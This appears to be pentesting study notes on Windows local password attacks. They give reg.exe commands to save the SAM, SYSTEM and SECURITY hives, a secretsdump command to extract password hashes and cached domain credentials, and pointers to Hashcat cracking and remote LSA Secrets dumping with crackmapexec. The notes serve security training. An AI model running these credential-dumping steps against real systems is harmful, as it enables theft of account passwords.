## Windows Local Password Attack
| **Registry Hive** | **Description** |
|-------------------|-----------------|
| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |
-----------------------------------------------------

Use reg.exe in *admin cmd* to save registry hives.
>***Note***: `hklm\sam` and `hklm\system` are only priotized, `hklm\security` may contain useful hashes

| **Command** | **Description** |
|-------------|-----------------|
| `reg.exe save hklm\sam C:\sam.save` | Save sam hive |
| `reg.exe save hklm\system C:\system.save` | Save system hive |
| `reg.exe save hklm\security C:\security.save` | Save security hive |

Launch impacket's smbshare to transfer files

After obtaining the file impacket's secretsdump is used to dump the files

| **Command** | **Description** |
|-------------|-----------------|
| `python3 <path>/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Dumps *local* SAM hashes along with cached domain logon information if domain-joined and had cached credentials present in hklm\security |

> ***Note*** It cannot dump hashes without the *target system bootkey* because the bootkey is used to encrypt and decrypt the SAM database.

> **Useful Tip** Operating systems older than Windows Vista and Windows Server 2008 store passwords as LM hashes.

Once the hashes are obtianed use Hashcat to crack them

With the credentials we then obtain local admin privileges. It is possible to then target the LSA Secrets (which manage user rights info, password hashes and other important bits) over the network which in turn may allow us to extract credentials from a running service, scheduled task and application that use LSA to store password.

> We can use crackmapexec to dump LSA Secrets remotely
